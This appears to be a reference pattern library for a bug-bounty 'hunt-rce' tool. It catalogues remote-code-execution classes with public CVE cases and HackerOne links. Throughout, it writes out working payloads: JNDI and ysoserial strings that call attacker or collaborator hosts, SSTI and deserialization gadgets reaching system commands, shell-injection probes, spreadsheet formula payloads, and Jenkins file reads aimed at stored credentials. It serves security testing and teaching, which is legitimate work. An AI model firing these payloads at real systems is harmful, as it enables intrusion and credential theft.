# hunt-rce — Pattern Library

> Patterns and verifiable public examples behind `hunt-rce`. Operator-grade reference, not a complete enumeration. Cited examples are well-known public cases that any reader can search and verify; uncited patterns are general operator knowledge accumulated from public bounty disclosures, CVEs, and conference talks.

RCE remains the highest-paying bug class because the proof is unambiguous (shell output, OOB callback from inside the target), the blast radius is infrastructure-wide, and the fix usually requires architectural changes rather than a quick patch. The patterns below are organized by primitive — every RCE eventually reduces to "attacker-controlled bytes reach a code-executing sink" — and the cited examples illustrate the most-discussed real-world instances of each primitive class.

## Cited Public Examples

### Log4Shell (CVE-2021-44228)
- **Source:** Apache Log4j 2 — disclosed December 2021. CVE-2021-44228. Massively documented across CISA advisories, vendor write-ups, and conference talks.
- **Pattern shape:** Any string logged by an application running a vulnerable version of Log4j 2 was passed through JNDI lookup substitution. An attacker who could influence any logged string (`User-Agent`, `X-Forwarded-For`, a username field, a chat message, the subject of an HTTP request that produces an error log) could embed `${jndi:ldap://attacker.tld/x}` and the Java process would dereference the LDAP URL, fetch a remote class, and execute it.
- **Key trick:** The sink was not "an endpoint that takes a URL" — it was "any log line." That moved the attack surface from a finite set of parameters to effectively *every* string the application logs, including ones the developer never thought of as user input.
- **Why it matters:** This is the canonical demonstration that the *sink* in an RCE primitive isn't always a function called `eval`. Logging frameworks, format strings, template engines, ORM expression languages, and serialization libraries are all execution sinks in the right (wrong) configuration. Always ask: "what library processes this string later?"

### Capital One SSRF→IMDS credential exfiltration (2019)
- **Source:** US Department of Justice charging documents and subsequent civil filings against Paige Thompson, 2019. Widely covered in mainstream technology press and used as a teaching case in cloud-security training.
- **Pattern shape:** A web application firewall misconfiguration permitted SSRF against the EC2 Instance Metadata Service (IMDSv1) at `169.254.169.254`. The attacker retrieved temporary IAM credentials from the instance role and used those credentials to list and download S3 buckets containing roughly 100 million customer records.
- **Key trick:** This is SSRF→privilege-escalation, not classical in-process RCE — but the operator lesson belongs in any RCE pattern library because the *practical impact* (full data exfil, infrastructure pivot) is RCE-equivalent. The privilege came from the metadata service, not from a memory-corruption primitive.
- **Why it matters:** Cloud-hosted targets multiply the value of any "fetch arbitrary URL" primitive. IMDSv2 (with `X-aws-ec2-metadata-token`) mitigates this, but operators still find IMDSv1-only configurations and partial v2 enforcement. Always test the IMDS path on any SSRF candidate before deciding the bug is "low impact."

### Java deserialization via ysoserial gadgets
- **Source:** Chris Frohoff and Gabriel Lawrence, AppSecCali 2015 talk "Marshalling Pickles." Tool released on GitHub as `frohoff/ysoserial`. The research catalogue (Commons-Collections, Spring, Hibernate, JDK7u21, and many others) is publicly maintained.
- **Pattern shape:** Any Java endpoint that accepts a serialized `java.io.Serializable` object (HTTP body, RMI, JMX, JNDI, T3 in WebLogic, IIOP, ViewState in ASP.NET-Java-bridges, message-queue payloads) and runs it through `ObjectInputStream.readObject()` without a class allowlist can be made to execute attacker-chosen `Runtime.exec` calls via a gadget chain — a sequence of methods invoked by the readObject machinery whose side effects culminate in code execution.
- **Key trick:** The vulnerability is not in `ObjectInputStream` itself; it is in the *combination* of `readObject` plus any vulnerable gadget on the classpath. Operators don't need to find a new gadget; they pick one from `ysoserial` matching the classpath dependencies (often inferred from response headers, error stack traces, or `WEB-INF/lib` enumeration).
- **Why it matters:** This pattern persists fifteen years after the first paper because allow-listing is hard, fix is library-by-library, and many enterprise Java stacks (WebLogic, JBoss, WebSphere, custom Spring apps) still accept serialized blobs on some path. The same shape repeats in .NET (`BinaryFormatter`, `LosFormatter`, `NetDataContractSerializer`), Python (`pickle`), Ruby (`Marshal.load`), and PHP (`unserialize` and the phar:// stream wrapper).

### Microsoft SharePoint ToolShell precondition chain (CVE-2025-53770)
- **Source:** Microsoft Security Response Center advisory and CISA Known Exploited Vulnerabilities catalogue, 2025. CVE-2025-53770.
- **Pattern shape:** A SharePoint on-prem flaw allowing remote unauthenticated code execution against specific SharePoint Server versions when a chained set of preconditions is met. Exploited in the wild against on-premises SharePoint farms.
- **Key trick:** The exploitable state requires more than one configuration condition to align — operator value lies in checking the *precondition set* (versions, patch level, exposed endpoints, FormDigest behavior) rather than firing a generic payload at every `/_layouts/15/` path.
- **Why it matters:** EoL or near-EoL enterprise products (SharePoint 2013/2016/2019) accumulate permanent CVE windows. Operators who fingerprint the version and check the precondition set against published CVE advisories will out-perform anyone running generic scanners. See `hunt-sharepoint` for the SharePoint-specific dispatcher.

### Apache HTTP Server 2.4.49/2.4.50 alias-path traversal (CVE-2021-41773 / CVE-2021-42013)
- **Source:** Apache HTTP Server security bulletin October 2021 (CVE-2021-41773); follow-up CVE-2021-42013 patched a partial-fix bypass days later. Both listed on CISA's Known Exploited Vulnerabilities catalogue. Still seen on internet-exposed servers years after disclosure because patching requires restarting `httpd`.
- **Pattern shape:** Apache 2.4.49 (and 2.4.50 with a patch bypass) misnormalizes dot-encoded path segments inside configured alias paths. An attacker hits `/icons/.%2e/.%2e/.%2e/etc/passwd` and Apache traverses out of DocumentRoot into the filesystem. If the alias has `Options +ExecCGI` (default for `/cgi-bin/`), the same primitive becomes RCE by traversing to `/bin/sh` and POSTing the command in the body.
- **Key trick:** **Same primitive, different impact tier.** File read on `/icons/` is a Medium finding; the same path traversal on `/cgi-bin/` is Critical. Operators who stop at the first successful disclosure miss the upgrade. Always re-probe every configured alias.
- **Why it matters:** Apache 2.4.49 is widespread on internet-exposed servers because patching requires a `httpd` restart and downtime windows. Verified by live exploit against `vulhub/httpd:CVE-2021-41773` — `/etc/passwd` disclosure and `id; uname -a` RCE confirmed. See `docs/verification/apache-cve-2021-41773.md`.

### Spring Cloud Function SpEL injection (CVE-2022-22963)
- **Source:** VMware Tanzu security advisory `cve-2022-22963`, March 2022. Spring Cloud Function ≤ 3.2.2 (and ≤ 3.1.6). The upstream commit `0e89ee27b2e76138c16bcba6f4bca906c4f3744f` ships the fix and explains the affected code path. Widely cited in vendor security bulletins and exploitation reports.
- **Pattern shape:** The `spring.cloud.function.routing-expression` HTTP header on `/functionRouter` is evaluated as a SpEL expression before any routing logic or auth gate. Attacker sends a POST with this header set to `T(java.lang.Runtime).getRuntime().exec(...)` and runs arbitrary commands in the JVM process — usually root in containerized deployments.
- **Key trick:** Many SpEL-injection CVEs target POST body or URL params; this one is a header. Operators who scan only bodies/params will miss it. Use the `new String[]{"cmd","arg"}` array form to avoid shell-quoting issues — `.exec("...")` with quotes breaks the header value parser.
- **Why it matters:** Spring Cloud Function deploys on AWS Lambda, GCP Cloud Run, and most on-prem function frameworks. The `/functionRouter` endpoint auto-registers — developers often expose it externally without realizing. Verified by live exploit against `vulhub/spring-cloud-function:3.2.2` — root command execution in 3 curl commands. See `docs/verification/spring-cve-2022-22963.md`.

### Jenkins CLI args4j `@`-prefix file read (CVE-2024-23897)
- **Source:** Jenkins Security Advisory 2024-01-24 and Atlassian-style reference write-ups by SonarSource and others. CVE-2024-23897. Added to CISA's Known Exploited Vulnerabilities catalogue in 2024.
- **Pattern shape:** Java's `args4j` library defaults to `expandAtFiles=true`, which interprets any CLI argument beginning with `@` as a filename whose contents replace the argument with the file's lines (one line per arg). Jenkins exposes its CLI over HTTP at `/cli` and `/jnlpJars/jenkins-cli.jar`. The server-side argument-parsing error verbatim echoes failed arguments back, giving an unauthenticated arbitrary-file-read primitive. With anonymous read access enabled (the default on fresh installs), no auth is required.
- **Key trick:** `connect-node @/etc/passwd` returns *every line* of `/etc/passwd` in distinct "No such agent" error lines. The crown-jewel chain is `@/proc/self/environ` to locate `JENKINS_HOME`, then `@/var/jenkins_home/secret.key` + `@/var/jenkins_home/credentials.xml` to lift every stored credential the CI/CD server holds.
- **Why it matters:** CI/CD servers concentrate every credential the org issues — AWS keys, kubeconfigs, SSH keys, source-repo tokens. A pre-auth file read on Jenkins is functionally equivalent to "internal lateral movement on day zero." The pattern generalizes to any Java service that embeds args4j without `expandAtFiles=false` and exposes the CLI handler over HTTP. Verified by live exploit run against `vulhub/jenkins:2.441` — see `docs/verification/jenkins-cve-2024-23897.md`.

---

### Dependency confusion → RCE in build / CI
- **Source:** Development projects defaulting to the public NPM registry instead of the internal one, enabling dependency confusion (<https://hackerone.com/reports/925585>, $30,000).
- **Pattern shape:** An internal package name is resolvable on a public registry (npm/PyPI/RubyGems). An attacker publishes a higher-version malicious package under that name; the victim's build/CI pulls it and executes install-time code → RCE in a privileged build context.
- **Key trick:** Harvest internal package names from leaked `package.json`/lockfiles/source maps (pairs with `hunt-source-leak`); check public-registry availability and scope claimability. Prove impact with a benign callback (`preinstall` → OOB), never a destructive payload.
- **Why it matters:** Supply-chain RCE reaching CI secrets; top-tier bounty, low duplicate rate.

### Archive / decompression / file-render RCE
- **Source:** A decompressed-archive size-validator bypass (<https://hackerone.com/reports/1609965>, $33,510); a file-extension handling flaw in an upload proxy (<https://hackerone.com/reports/1154542>, $20,000); wiki-content rendering that invoked a command on certain extensions (<https://hackerone.com/reports/1125425>, $20,000).
- **Pattern shape:** A server processes attacker-controlled files — extracting archives, rendering documents/wikis, transforming images — and an unsafe handler (a shell-out renderer, a vulnerable parser, an extension-to-processor map) executes code from the file's content or name.
- **Key trick:** Map every file-processing pipeline (upload → render/convert/extract). Test extensions that route to a code-capable processor (`.rmd`, `.svg`, office macros, `.tar` with traversal). Confirm execution with an OOB callback.
- **Why it matters:** File-processing RCE is a dominant modern class; consistently $20k+.

### Import / integration → command execution
- **Source:** Remote command execution via a source-import (from-GitHub) feature (<https://hackerone.com/reports/1679624>, $33,510).
- **Pattern shape:** An import/mirror/integration feature clones or fetches an attacker-controlled repository/URL and runs a build, hook, or interpreter over its contents (`.git/hooks`, CI config, a Makefile, a lockfile install script) — executing attacker code server-side.
- **Key trick:** Point import/mirror features at an attacker repo containing hooks/CI/build files; watch for server-side execution. Pairs with the dependency-confusion and archive vectors above.
- **Why it matters:** Import features are a recurring RCE surface on dev/collaboration platforms.

### Further disclosed reports (this class)

Additional high-signal public disclosures exemplifying the patterns above; read at source for full technique.

- <https://hackerone.com/reports/591295> — $20160
- <https://hackerone.com/reports/873614> — $15000
- <https://hackerone.com/reports/658013> — $12000
- <https://hackerone.com/reports/181879> — $18000
- <https://hackerone.com/reports/587854> — $12000
- <https://hackerone.com/reports/2177925> — $12500
- <https://hackerone.com/reports/470520> — $0
- <https://hackerone.com/reports/584603> — $9000
- <https://hackerone.com/reports/1168765> — $10000
- <https://hackerone.com/reports/852613> — $10000
- <https://hackerone.com/reports/807772> — $7500
- <https://hackerone.com/reports/365271> — $5000
- <https://hackerone.com/reports/463286> — $7500
- <https://hackerone.com/reports/2255750> — $8000
- <https://hackerone.com/reports/422944> — $0
- <https://hackerone.com/reports/682442> — $7000
- <https://hackerone.com/reports/403417> — $0
- <https://hackerone.com/reports/1070835> — $7500
- <https://hackerone.com/reports/876719> — $7500
- <https://hackerone.com/reports/138869> — $7000
- <https://hackerone.com/reports/1418891> — $6000
- <https://hackerone.com/reports/506646> — $0
- <https://hackerone.com/reports/630462> — $3645
- <https://hackerone.com/reports/733267> — $5000
- <https://hackerone.com/reports/129873> — $0
- <https://hackerone.com/reports/1104874> — $5000
- <https://hackerone.com/reports/2438265> — $4860
- <https://hackerone.com/reports/1200647> — $5000
- <https://hackerone.com/reports/502758> — $0
- <https://hackerone.com/reports/2231019> — $5000
- <https://hackerone.com/reports/544928> — $0
- <https://hackerone.com/reports/180074> — $0
- <https://hackerone.com/reports/513154> — $3000
- <https://hackerone.com/reports/653125> — $3500
- <https://hackerone.com/reports/861744> — $5000
- <https://hackerone.com/reports/783877> — $0
- <https://hackerone.com/reports/1776476> — $4000
- <https://hackerone.com/reports/231053> — $3000
- <https://hackerone.com/reports/631956> — $0
- <https://hackerone.com/reports/1065500> — $0
- <https://hackerone.com/reports/946409> — $0
- <https://hackerone.com/reports/1401444> — $3000
- <https://hackerone.com/reports/487008> — $0
- <https://hackerone.com/reports/484745> — $3000
- <https://hackerone.com/reports/397545> — $0
- <https://hackerone.com/reports/851807> — $0
- <https://hackerone.com/reports/544096> — $2500
- <https://hackerone.com/reports/1024575> — $0
- <https://hackerone.com/reports/1728174> — $2500
- <https://hackerone.com/reports/1620702> — $2500
- <https://hackerone.com/reports/550625> — $2500
- <https://hackerone.com/reports/540242> — $2000
- <https://hackerone.com/reports/1672388> — $0
- <https://hackerone.com/reports/1891795> — $2400
- <https://hackerone.com/reports/833080> — $1500
- <https://hackerone.com/reports/298873> — $2000
- <https://hackerone.com/reports/1027822> — $0
- <https://hackerone.com/reports/402362> — $2000
- <https://hackerone.com/reports/1705717> — $2000
- <https://hackerone.com/reports/212696> — $0
- <https://hackerone.com/reports/1652042> — $2000
- <https://hackerone.com/reports/329689> — $0
- <https://hackerone.com/reports/125218> — $2000
- <https://hackerone.com/reports/1624137> — $1000
- <https://hackerone.com/reports/722327> — $1500
- <https://hackerone.com/reports/473888> — $1500
- <https://hackerone.com/reports/152398> — $1000
- <https://hackerone.com/reports/1078002> — $1000
- <https://hackerone.com/reports/113928> — $1500
- <https://hackerone.com/reports/98259> — $1500
- <https://hackerone.com/reports/122113> — $1500
- <https://hackerone.com/reports/351014> — $0
- <https://hackerone.com/reports/1624172> — $1000
- <https://hackerone.com/reports/152399> — $1000
- <https://hackerone.com/reports/116286> — $1000
- <https://hackerone.com/reports/152400> — $1000
- <https://hackerone.com/reports/99424> — $1000
- <https://hackerone.com/reports/127212> — $1000
- <https://hackerone.com/reports/114079> — $1000
- <https://hackerone.com/reports/114078> — $1000
- <https://hackerone.com/reports/167688> — $1000
- <https://hackerone.com/reports/106548> — $1000

## Pattern Library

### Java deserialization on a non-obvious endpoint
- **When to suspect:** Response carries `Content-Type: application/x-java-serialized-object`, `application/vnd.java.serialized-object`, or you observe a base64 blob beginning with `rO0AB` (the standard `ObjectInputStream` magic, base64-encoded). Also: any Java target accepting a `viewstate=`-like opaque blob from the client.
- **Test:** Generate a `ysoserial CommonsCollections5 'curl http://<collab>/x'` payload, base64-encode it, post it to the suspected sink. Observe Collaborator for HTTP/DNS callback.
- **Validation:** Out-of-band callback from the *target server's source IP*, not your test browser. If only DNS fires, confirm with an HTTP gadget (CommonsBeanutils1, Hibernate1) to differentiate from a passive DNS prefetch.
- **Pay-grade rationale:** Critical. Unauthenticated RCE on a public-facing enterprise app is the canonical critical bug; programs price these at the top of the table because the alternative is a vendor incident response.

### Python `pickle.loads` on attacker-supplied bytes
- **When to suspect:** A Python service accepts a session cookie, a cached object blob, a message-queue payload, or a "state" parameter that round-trips through the client. Server is Flask/Django/FastAPI/Pyramid; cookies look base64 but decode to non-printable bytes starting with `\x80\x04` (pickle protocol 4 marker) or `(dp` (protocol 0).
- **Test:** Craft a class with `__reduce__` returning `(os.system, ('id > /tmp/x',))`, pickle it, send it as the cookie/blob, and observe the side effect (file appears, OOB callback fires, response timing changes).
- **Validation:** OOB callback or filesystem artifact. Do not rely on response-body changes alone — many pickle exceptions still return 500 without executing the gadget.
- **Pay-grade rationale:** Critical to high. Equivalent to Java deserialization, with the added irony that Python's stdlib has shipped this warning for two decades.

### Ruby Marshal / YAML.load / ERB injection
- **When to suspect:** Rails or Sinatra app, observable `Marshal.dump`-style cookies or jobs queued through ActiveJob/Sidekiq. `YAML.load` (pre-Psych-safe-mode) processed against attacker input. ERB or Liquid templates rendered with attacker-controlled strings.
- **Test:** Construct a `Gem::Specification`-style gadget for Marshal, or a `!ruby/object:Gem::Installer` payload for YAML, and inject. For ERB, `<%= system('id') %>` is the textbook probe; for Liquid, look for filter-chain abuse or version-specific bypasses.
- **Validation:** OOB callback or command-output reflection in the rendered template.
- **Pay-grade rationale:** Critical when reachable unauthenticated; high otherwise. Ruby gadget chains are often easier than Java because the language is more permissive about object construction.

### .NET `BinaryFormatter` / `LosFormatter` / ViewState MAC bypass
- **When to suspect:** ASP.NET WebForms app, ViewState present in the response, target uses Framework 4.x or earlier. Look for `__VIEWSTATE` posted on every form. Check `web.config` exposure: `EnableViewStateMac` set to false, or known leaked machineKey.
- **Test:** `ysoserial.net -g TypeConfuseDelegate -f LosFormatter -c 'curl http://<collab>/'` with the recovered or known machineKey. POST as `__VIEWSTATE`.
- **Validation:** OOB callback from the target. Cross-reference with `hunt-aspnet` for the dual-parser MAC-bypass anti-pattern, which can let a ViewState through without a valid signature in some configurations.
- **Pay-grade rationale:** Critical when ViewState MAC is missing or bypassable; less when MAC is enforced and machineKey is unknown.

### PHP `unserialize` and phar:// stream wrapper
- **When to suspect:** Legacy PHP application, file paths accepted from user input (uploads, image processors, ZIP-archive readers, RSS readers), or any `file_exists`/`is_file`/`fopen` that runs against attacker-controlled paths. Older PHP versions (pre-8.0) auto-deserialize phar metadata when the path is read.
- **Test:** Upload a `.phar` (or rename it to `.jpg` if MIME-only validation is in play) whose metadata contains a serialized object matching a class with a `__destruct` or `__wakeup` magic method that reaches a sink. Reference the file via `phar://path/to/uploaded.jpg/anything`.
- **Validation:** OOB callback when the upload is processed, or file-side effect.
- **Pay-grade rationale:** High to critical depending on auth state and the reachable class set.

### Server-side template injection (SSTI) escalation chain
- **When to suspect:** Probe `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>` against any reflected parameter and observe `49` in the response. Engine fingerprint follows from the syntax that succeeded.
- **Test:** Jinja2 → `{{ ''.__class__.__mro__[1].__subclasses__() }}` walker into `subprocess.Popen`. Twig → `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}`. Freemarker → `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`. ERB → `<%= IO.popen('id').read %>`. Spring SpEL → `T(java.lang.Runtime).getRuntime().exec('id')`.
- **Validation:** Command output reflected in body OR OOB callback from a `curl` payload.
- **Pay-grade rationale:** Critical. SSTI almost always equals RCE in modern engines; the cross-reference is `hunt-ssti`.

### Command injection via shell metacharacter fan-out
- **When to suspect:** A parameter that feeds a backend tool — image conversion (ImageMagick, ghostscript), DNS lookup, network diagnostic, archive extractor, video transcoder (ffmpeg). Backend probably uses `system`, `exec`, `subprocess.call(shell=True)`, or Ruby backticks.
- **Test:** Layered payloads: `; id`, `| id`, `` `id` ``, `$(id)`, `' && id #`. If quotes are stripped, try `\\\\&\\\\& id`, `%0aid`, `%0d%0aid`. For ImageMagick CVE-2016 / `MSL` style flaws, an `mvg` file with `push graphic-context\nimage Over 0,0 0,0 'url(https://<collab>/x)'\npop graphic-context` validates server-side fetch and often code execution.
- **Validation:** Command-output reflection, OOB callback, or response-timing differential (`; sleep 10`).
- **Pay-grade rationale:** High to critical. Easy proof; often unauthenticated.

### Node.js prototype pollution → RCE gadget
- **When to suspect:** Node.js backend, `lodash.merge`, `Object.assign`, manual deep-merge loops, query-string parsers without prototype protection. Look for endpoints that accept JSON and patch user state — particularly `__proto__`-laden bodies that survive a round trip.
- **Test:** POST `{"__proto__":{"shell":"/usr/bin/id","outputType":"buffer"}}` or a known gadget per the polluted-prototype-to-RCE catalogue (the gadget depends on which library reaches `child_process.spawn` with `options` from `Object.create(null)`-violating merges).
- **Validation:** Pollute on one endpoint, trigger the gadget on another, get OOB callback or command output.
- **Pay-grade rationale:** Critical when the gadget reaches `spawn`/`exec`. High when it reaches a downgrade primitive (e.g. forcing `verify:false` in an HTTP client used for SSO).

### Node.js `eval` / `Function` / `vm` over attacker JSON
- **When to suspect:** API endpoint that accepts a "formula," "expression," "script," or "callback" string and evaluates it server-side. `mathjs`-style expression evaluators are recurring offenders; some have shipped patches and reverted by minor-version downgrade.
- **Test:** Engine-specific escape — `mathjs` historically allowed `import` namespace abuse; `vm2` sandbox-escape CVEs are public; raw `eval` is `process.mainModule.require('child_process').execSync('id')`.
- **Validation:** Command output or OOB callback.
- **Pay-grade rationale:** Critical when sandbox is absent; high when sandbox version has a known escape.

### Git-config injection in clone/import sinks
- **When to suspect:** Application clones a remote git repository from user input — CI/CD test runners, build systems, "import from GitHub URL" features, SCM mirrors.
- **Test:** Reference patterns from public research (Snyk and others have published this class). A repository URL or branch name containing `--upload-pack=...` or `--config=...` flags can change `git`'s behavior at the CLI boundary; properly crafted, this reaches command execution as the build user.
- **Validation:** OOB callback or build-log evidence of `--upload-pack` honoring the attacker's payload.
- **Pay-grade rationale:** Critical when reachable on a build worker with credentials; medium on isolated runners.

### YAML deserialization via SnakeYAML / PyYAML / Psych
- **When to suspect:** Endpoint accepts YAML — config import, OpenAPI/Swagger upload, Helm/Kustomize handler, Rails YAML cookie. Old defaults parsed `!!python/object` or `!ruby/object:` tags into live instances.
- **Test:** PyYAML pre-`safe_load`: `!!python/object/apply:os.system ["id"]`. SnakeYAML pre-allowlist: `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://<collab>/"]]]]`.
- **Validation:** OOB callback.
- **Pay-grade rationale:** Critical when unauthenticated.

### CSV / Excel formula injection escalating to local RCE
- **When to suspect:** Export/download endpoints that emit CSV or XLSX with attacker-controlled cell content. The classic `=cmd|'/c calc'!A1` formula executes on the *recipient's* machine when the file is opened in Excel.
- **Test:** Plant `=cmd|' /C calc'!A1`, `@SUM(...)`, `=HYPERLINK("https://<collab>/x","Click")` in any field that round-trips to CSV.
- **Validation:** Confirmed execution in Excel with macros allowed, OR confirmed credential leak via the hyperlink probe (Excel sometimes auto-fetches without user interaction).
- **Pay-grade rationale:** Medium typically; high if the consumer is a SOC analyst or admin opening exports.

### LDAP injection escalating into Java RCE
- **When to suspect:** Java app exposes an authentication or directory-lookup endpoint that builds LDAP filters from user input. Combined with JNDI lookups (the Log4Shell primitive), LDAP-injection-controllable filters can serve a payload class.
- **Test:** Inject `*)(objectClass=*` style filter manipulation to confirm the injection point, then point JNDI/RMI at a controlled LDAP server returning a malicious class reference.
- **Validation:** OOB callback from the target dereferencing the LDAP reference.
- **Pay-grade rationale:** Critical when reachable.

### .NET ViewState load-balanced cross-node deserialization
- **When to suspect:** ASP.NET WebForms farm with multiple nodes, ViewState validation occasionally fails (`__VIEWSTATE` mismatches across requests), suggesting machineKey desync. See `hunt-aspnet`.
- **Test:** Capture a valid ViewState, replay across nodes, observe nodes that accept it. If a node accepts a forged ViewState, repeat with a ysoserial.net gadget.
- **Validation:** OOB callback.
- **Pay-grade rationale:** Critical on the lagging node.

---

## Anti-Patterns (FP traps)

### "File write to a static directory" claimed as RCE
- **Looks like:** You upload a `.php` / `.jsp` / `.aspx` / `.asp` file and the server returns 200. Or you find a write-anywhere primitive via path traversal.
- **Actually is:** A write primitive is not an execution primitive until the file is requested *and the request reaches an interpreter*. Most modern stacks serve user-upload directories with a strict `Content-Type` and no scripting; some explicitly drop `.php` to `text/plain`.
- **How to disprove:** GET the uploaded file. If the response is the raw file bytes with `Content-Type: text/plain` (or octet-stream) and no execution side effect, it's a write primitive, not RCE. Chain it (overwrite a real script, write to a path served by an interpreter, write to a config file consumed at startup) before claiming RCE.

### `eval(JSON.parse(input))` in a frozen-prototype sandbox
- **Looks like:** Source code grep hits `eval(` near user input. Looks gameover.
- **Actually is:** Modern code increasingly wraps `eval` in `Function` constructors with frozen globals, or runs in `vm.runInNewContext` with no `require` reference. The literal `eval` does nothing dangerous.
- **How to disprove:** Run a known-trivial payload (`process.mainModule.require('child_process').execSync('id')` or `globalThis.process.binding('spawn_sync')`) and check whether it actually executes. If the sandbox rejects everything you throw at it and there's no public escape CVE for the sandbox version, you have a hardened eval, not RCE.

### Path traversal that reads but does not write
- **Looks like:** `?file=../../../../etc/passwd` returns the file.
- **Actually is:** A read primitive. Reading `/etc/passwd` is information disclosure, not code execution.
- **How to disprove:** Can you write the same way? Try `..%2F` on a PUT/POST endpoint, look for log-poisoning paths (write to a log file that gets included), or look for SSH-key-write paths. If only reading works, classify as LFI/path-traversal — significant but not RCE.

### SSRF echo claimed as "fetch + execute"
- **Looks like:** The server prints your URL in an error message. You assume it fetched the URL and want to chain to RCE via gopher://internal-redis.
- **Actually is:** String formatting in an error template. The server never made the outbound request.
- **How to disprove:** Plant a Burp Collaborator subdomain. If zero DNS or HTTP interactions arrive, no fetch happened. Re-read `hunt-ssrf` OOB-or-it-didn't-happen gate.
